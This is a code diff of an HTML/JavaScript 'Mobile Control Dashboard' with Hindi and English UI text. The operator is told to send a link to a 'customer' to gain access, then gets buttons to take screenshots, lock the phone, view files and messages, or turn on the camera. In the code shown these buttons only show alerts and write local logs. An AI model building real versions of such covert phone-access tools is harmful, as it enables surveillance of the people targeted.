@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile Control Dashboard</title>
+    <title>Control Dashboard</title>
     <style>
         * {
             margin: 0;
@@ -32,40 +32,18 @@
             margin-bottom: 15px;
             font-size: 28px;
         }
-        .share-section {
-            background: #f5f5f5;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-        .share-section label {
-            display: block;
-            color: #333;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .share-link {
-            display: flex;
-            gap: 10px;
-        }
-        .share-link input {
-            flex: 1;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-family: monospace;
-        }
-        .share-link button {
-            padding: 12px 20px;
+        .refresh-btn {
             background: #667eea;
             color: white;
             border: none;
+            padding: 12px 20px;
             border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
+            margin-right: 10px;
             transition: 0.3s;
         }
-        .share-link button:hover {
+        .refresh-btn:hover {
             background: #764ba2;
         }
         .devices-grid {
@@ -101,14 +79,8 @@
             border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
-        }
-        .status.online {
             background: #d4edda;
             color: #155724;
-        }
-        .status.offline {
-            background: #f8d7da;
-            color: #721c24;
         }
         .device-info {
             margin-bottom: 20px;
@@ -117,6 +89,7 @@
         .device-info p {
             color: #666;
             margin-bottom: 8px;
+            word-break: break-all;
         }
         .device-info strong {
             color: #333;
@@ -264,14 +237,8 @@
     <div class="dashboard">
         <div class="header">
             <h1>🎮 Mobile Control Dashboard</h1>
-            <div class="share-section">
-                <label>📱 अपना Link साझा करें:</label>
-                <div class="share-link">
-                    <input type="text" id="shareLink" readonly value="https://niharika99057-netizen.github.io/mobile-remote-control/">
-                    <button onclick="copyLink()">📋 Copy Link</button>
-                </div>
-                <p style="color: #666; font-size: 12px; margin-top: 10px;">इस link को अपने customer को भेजो, वह click करे और तुम्हें access मिल जायेगा।</p>
-            </div>
+            <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Now</button>
+            <span id="refreshStatus" style="color: #667eea; font-weight: bold;"></span>
         </div>
 
         <div id="devicesContainer"></div>
@@ -295,42 +262,14 @@
     </div>
 
     <script>
-        // Sample connected devices data
         let devices = [];
         let activityLogs = [];
         let currentControlAction = null;
 
-        // Initialize with some demo devices
-        function initDemo() {
-            devices = [
-                {
-                    id: 1,
-                    name: 'Customer 1',
-                    phone: '+91-98XXXXX123',
-                    status: 'online',
-                    connectedTime: '5 मिनट पहले',
-                    lastActivity: 'Link click किया',
-                    timestamp: new Date(Date.now() - 5 * 60000)
-                },
-                {
-                    id: 2,
-                    name: 'Customer 2',
-                    phone: '+91-97XXXXX456',
-                    status: 'online',
-                    connectedTime: '15 मिनट पहले',
-                    lastActivity: 'access दिया',
-                    timestamp: new Date(Date.now() - 15 * 60000)
-                }
-            ];
-
-            activityLogs = [
-                { time: '11:35 AM', action: 'Customer 1 - Link click किया' },
-                { time: '11:30 AM', action: 'Customer 2 - Access दिया' },
-                { time: '11:25 AM', action: 'Link साझा किया' }
-            ];
-
+        // Load devices from localStorage
+        function loadDevices() {
+            devices = JSON.parse(localStorage.getItem('connectedDevices')) || [];
             renderDevices();
-            renderActivityLog();
         }
 
         function renderDevices() {
@@ -340,8 +279,11 @@
                 container.innerHTML = `
                     <div class="no-devices">
                         <h2>📱 कोई Device जुड़ा नहीं है</h2>
-                        <p>अपना Link साझा करो और अपने customer को access दो!</p>
-                        <button class="control-btn" onclick="copyLink()" style="max-width: 200px; margin: 0 auto;">📋 Link Copy करो</button>
+                        <p>जब कोई customer link को click करेगा और permission देगा, तो यहाँ दिखेगा।</p>
+                        <br>
+                        <p style="font-size: 14px; color: #999;">💡 Hint: Customer को यह link भेजो:</p>
+                        <p style="font-size: 12px; color: #667eea; font-family: monospace; background: #f5f5f5; padding: 10px; border-radius: 5px;">https://niharika99057-netizen.github.io/mobile-remote-control/</p>
+                        <button class="control-btn" onclick="refreshDevices()" style="max-width: 200px; margin: 20px auto 0; width: 100%;">🔄 Refresh करो</button>
                     </div>
                 `;
                 return;
@@ -349,24 +291,25 @@
 
             container.innerHTML = `
                 <div class="devices-grid">
-                    ${devices.map(device => `
+                    ${devices.map((device, index) => `
                         <div class="device-card">
                             <div class="device-header">
-                                <h2>${device.name}</h2>
-                                <span class="status ${device.status}">${device.status === 'online' ? '🟢 Online' : '⚫ Offline'}</span>
+                                <h2>Device ${index + 1}</h2>
+                                <span class="status">🟢 Online</span>
                             </div>
                             <div class="device-info">
-                                <p><strong>📱 Phone:</strong> ${device.phone}</p>
-                                <p><strong>⏰ Connected:</strong> ${device.connectedTime}</p>
-                                <p><strong>📍 Last Activity:</strong> ${device.lastActivity}</p>
+                                <p><strong>📱 Device ID:</strong> ${device.id}</p>
+                                <p><strong>🔑 Access Code:</strong> ${device.accessCode}</p>
+                                <p><strong>⏰ Connected:</strong> ${new Date(device.timestamp).toLocaleTimeString()}</p>
+                                <p><strong>📍 Status:</strong> ${device.lastActivity}</p>
                             </div>
                             <div class="controls">
-                                <button class="control-btn" onclick="showControlModal(${device.id}, 'स्क्रीनशॉट ले सकते हो?', 'screenshot')">📸 Screenshot</button>
-                                <button class="control-btn" onclick="showControlModal(${device.id}, 'फोन लॉक करने हैं?', 'lock')">🔒 Lock</button>
-                                <button class="control-btn" onclick="showControlModal(${device.id}, 'Files देख सकते हो?', 'files')">📁 Files</button>
-                                <button class="control-btn" onclick="showControlModal(${device.id}, 'Messages देख सकते हो?', 'messages')">💬 Messages</button>
-                                <button class="control-btn" onclick="showControlModal(${device.id}, 'कैमरा ऑन करना है?', 'camera')">📷 Camera</button>
-                                <button class="control-btn danger" onclick="showControlModal(${device.id}, 'एक्सेस disconnect करने हैं?', 'disconnect')">❌ Disconnect</button>
+                                <button class="control-btn" onclick="showControlModal(${index}, 'स्क्रीनशॉट ले सकते हो?', 'screenshot')">📸 Screenshot</button>
+                                <button class="control-btn" onclick="showControlModal(${index}, 'फोन लॉक करने हैं?', 'lock')">🔒 Lock</button>
+                                <button class="control-btn" onclick="showControlModal(${index}, 'Files देख सकते हो?', 'files')">📁 Files</button>
+                                <button class="control-btn" onclick="showControlModal(${index}, 'Messages देख सकते हो?', 'messages')">💬 Messages</button>
+                                <button class="control-btn" onclick="showControlModal(${index}, 'कैमरा ऑन करना है?', 'camera')">📷 Camera</button>
+                                <button class="control-btn danger" onclick="removeDevice(${index})">❌ Disconnect</button>
                             </div>
                         </div>
                     `).join('')}
@@ -374,8 +317,41 @@
             `;
         }
 
+        function refreshDevices() {
+            loadDevices();
+            loadActivityLogs();
+            document.getElementById('refreshStatus').textContent = '✅ Refreshed!';
+            setTimeout(() => {
+                document.getElementById('refreshStatus').textContent = '';
+            }, 2000);
+        }
+
+        function removeDevice(index) {
+            if (confirm('क्या आप इस device को disconnect करना चाहते हैं?')) {
+                devices.splice(index, 1);
+                localStorage.setItem('connectedDevices', JSON.stringify(devices));
+                loadDevices();
+                addActivityLog('❌ Device Disconnected');
+                alert('✅ Device disconnect हो गया!');
+            }
+        }
+
+        function loadActivityLogs() {
+            activityLogs = JSON.parse(localStorage.getItem('activityLogs')) || [];
+            if (activityLogs.length === 0) {
+                activityLogs = [
+                    { time: new Date().toLocaleTimeString(), action: '🔄 Dashboard Started' }
+                ];
+            }
+            renderActivityLog();
+        }
+
         function renderActivityLog() {
             const container = document.getElementById('activityLog');
+            if (activityLogs.length === 0) {
+                container.innerHTML = '<p style="color: #999;">कोई गतिविधि नहीं</p>';
+                return;
+            }
             container.innerHTML = activityLogs.map(log => `
                 <div class="log-entry">
                     <span class="time">${log.time}</span>
@@ -384,8 +360,18 @@
             `).join('');
         }
 
-        function showControlModal(deviceId, message, action) {
-            currentControlAction = { deviceId, action };
+        function addActivityLog(action) {
+            const now = new Date();
+            activityLogs.unshift({
+                time: now.toLocaleTimeString(),
+                action: action
+            });
+            localStorage.setItem('activityLogs', JSON.stringify(activityLogs));
+            renderActivityLog();
+        }
+
+        function showControlModal(index, message, action) {
+            currentControlAction = { index, action };
             document.getElementById('modalMessage').textContent = message;
             document.getElementById('controlModal').classList.add('active');
         }
@@ -397,20 +383,10 @@
                     'lock': '🔒 Phone lock किया गया',
                     'files': '📁 Files access किया गया',
                     'messages': '💬 Messages देखे गए',
-                    'camera': '📷 Camera activate किया गया',
-                    'disconnect': '❌ Access disconnect किया गया'
+                    'camera': '📷 Camera activate किया गया'
                 };
 
-                // Add to activity log
-                const now = new Date();
-                const time = now.getHours().toString().padStart(2, '0') + ':' + 
-                            now.getMinutes().toString().padStart(2, '0');
-                activityLogs.unshift({
-                    time: time + ' AM',
-                    action: actions[currentControlAction.action]
-                });
-
-                renderActivityLog();
+                addActivityLog(actions[currentControlAction.action]);
                 closeModal();
                 alert('✅ ' + actions[currentControlAction.action]);
             }
@@ -421,14 +397,16 @@
             currentControlAction = null;
         }
 
-        function copyLink() {
-            const link = document.getElementById('shareLink').value;
-            navigator.clipboard.writeText(link);
-            alert('✅ Link copy हो गया! अपने customer को भेज दो।');
-        }
-
         // Initialize
-        initDemo();
+        window.addEventListener('load', () => {
+            loadDevices();
+            loadActivityLogs();
+        });
+
+        // Auto-refresh every 3 seconds
+        setInterval(() => {
+            loadDevices();
+        }, 3000);
     </script>
 </body>
 </html>
